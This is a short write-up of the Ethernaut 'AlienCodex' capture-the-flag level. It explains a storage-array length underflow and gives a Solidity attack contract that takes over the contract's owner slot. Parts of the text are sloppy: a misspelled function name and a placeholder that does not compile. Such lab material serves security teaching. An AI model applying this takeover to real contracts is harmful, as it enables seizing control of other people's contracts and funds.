# AlienCodex  
This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of 2^256. The user is then able to modify all contract storage.

## Steps:
1. Call `make_contact()` to make contact *true*.
2. THe array size at this moment is zero , so by calling retract an underflow will occur and the array length will be 2^256.This will allow as to access any data slot in the contract.
3. Call function `revice()` with the calculated index of the owner variable and the address.
## code:
````solidity
pragma solidity ^0.8.0;

interface AlienCodex {
    function make_contact() external;
    function retract()  external;
    function revise(uint i, bytes32 _content) external;
}

contract Attack{
    constructor() public payable{

    }

    function exploit(address victim) public {
        AlienCodex alien_codex = AlienCodex(victim);
        alien_codex.make_contact();
        alien_codex.retract();
        alien_codex.revise(
            35707666377435648211887908874984608119992236509074197713628505308453184860938,
            0x000000000000000000000000 `your address`
        );
    }

}
````
## how to calculate the index:
The owner variable is located at slot zero with contact boolean using this with the hashing algorithem used in arrays we can get the index.
For more details about the calculation you can visit this link:https://ylv.io/ethernaut-alien-codex-solution/